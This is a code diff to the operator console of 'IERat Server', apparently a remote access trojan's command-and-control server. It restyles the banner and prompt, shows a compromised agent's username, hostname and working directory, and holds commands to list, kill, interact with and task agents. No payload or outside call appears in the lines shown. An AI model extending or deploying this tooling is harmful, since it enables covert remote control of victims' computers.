@@ -7,11 +7,19 @@ using IERatServer.lib;
 using Figgle;
 using IERat.lib;
 using NClap.Utilities;
+using System.Drawing;
+using Console = Colorful.Console;
+using Colorful;
 
 namespace IERatServer
 {
     public class CLI
     {
+        public static LoopInputOutputParameters ioParams = new()
+        {
+            Prompt = ColoredString.FromString("IERat# ")
+        };
+        public static Loop loop = new(typeof(MyCommandType), ioParams);
         public static int InteractContext = 1;
         public static int TimeOutSeconds = 30;
         enum MyCommandType
@@ -54,9 +62,9 @@ namespace IERatServer
         {
             public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
             {
-                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.ForegroundColor = Color.Yellow;
                 Db.ListChannels();
-                Console.ForegroundColor = ConsoleColor.White;
+                Console.ForegroundColor = Color.White;
                 return Task.FromResult(CommandResult.Success);
             }
         }
@@ -114,9 +122,9 @@ namespace IERatServer
         {
             public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
             {
-                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.ForegroundColor = Color.Yellow;
                 Db.ListTasks();
-                Console.ForegroundColor = ConsoleColor.White;
+                Console.ForegroundColor = Color.White;
                 return Task.FromResult(CommandResult.Success);
             }
         }
@@ -131,7 +139,6 @@ namespace IERatServer
                 return Task.FromResult(CommandResult.Success);
             }
         }
-
         class KillCommand : Command
         {
             public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
@@ -140,7 +147,6 @@ namespace IERatServer
                 return Task.FromResult(CommandResult.Success);
             }
         }
-
         class InteractCommand : Command
         {
             [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "the agent number from the agents table")]
@@ -150,27 +156,23 @@ namespace IERatServer
                 InteractContext = AgentNumber;
                 if (Db.ChannelExists(AgentNumber)) {
                     Console.WriteLine($"\n---> Interacting with agent #{InteractContext}\n");
+                    AgentChannel ActiveChannel = Db.channels.Find(ActiveChannel => ActiveChannel.InteractNum == InteractContext);
+                    var agent = ActiveChannel.agent;
+                    if (ActiveChannel != null) {
+                        loop._client.Prompt = $"({agent.Username}@{agent.Hostname})-[{agent.Cwd}]$ ";
+                    }
                 }
-                else { Console.WriteLine("\n---> Bad ID number!\n"); }
+                else { Colorful.Console.WriteLine("\n---> Bad ID number!\n"); }
+
                 return Task.FromResult(CommandResult.Success);
             }
         }
-
         public static void RunInteractiveShell()
         {
-            Console.ForegroundColor = ConsoleColor.Blue;
-            Console.WriteLine(FiggleFonts.Univers.Render("IERat"));
-            Console.WriteLine("\tPowered by Internet Explorer!\t\n");
-            Console.ForegroundColor = ConsoleColor.White;
-
-            var ioParams = new LoopInputOutputParameters
-            {
-                Prompt = ColoredString.FromString("IERat# ")
-            };
-            var loop = new Loop(typeof(MyCommandType), ioParams);
+            Console.WriteLine(Figgle.FiggleFonts.CyberLarge.Render("IERat Server"), Color.LightYellow);
+            Console.WriteWithGradient("\t\t\t\tPowered by Internet Explorer!\t\n\n", Color.White, Color.LightSkyBlue, 24);
             loop.Execute();
         }
-
         public static void AddTaskToActiveAgent(string type, string args = "")
         {
             TaskObject taskObject = new()
